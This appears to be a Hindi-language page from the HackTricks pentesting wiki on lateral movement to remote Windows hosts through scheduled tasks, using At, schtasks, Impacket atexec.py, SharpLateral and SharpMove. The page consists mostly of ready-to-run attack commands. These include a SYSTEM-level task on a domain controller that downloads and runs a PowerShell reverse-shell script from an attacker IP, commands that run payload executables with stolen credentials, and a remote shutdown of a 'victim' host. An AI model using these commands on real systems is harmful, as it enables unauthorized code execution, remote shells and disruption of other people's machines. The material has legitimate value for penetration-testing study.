# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## यह कैसे काम करता है

At आपको उन होस्ट में कार्य शेड्यूल करने की अनुमति देता है जहाँ आप उपयोगकर्ता नाम/(पासवर्ड/हैश) जानते हैं। इसलिए, आप इसका उपयोग अन्य होस्ट में कमांड निष्पादित करने और आउटपुट प्राप्त करने के लिए कर सकते हैं।
```
At \\victim 11:00:00PM shutdown -r
```
schtasks का उपयोग करते हुए, आपको पहले कार्य बनाना होगा और फिर उसे कॉल करना होगा:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
आप **Impacket's `atexec.py`** का उपयोग करके AT कमांड का उपयोग करके दूरस्थ सिस्टम पर कमांड निष्पादित कर सकते हैं। इसके लिए लक्षित सिस्टम के लिए मान्य क्रेडेंशियल्स (उपयोगकर्ता नाम और पासवर्ड या हैश) की आवश्यकता होती है।
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
आप [SharpLateral](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
आप [SharpMove](https://github.com/0xthirteen/SharpMove) का उपयोग कर सकते हैं:
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[**सिल्वर टिकट के साथ schtasks के उपयोग के बारे में अधिक जानकारी यहाँ**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
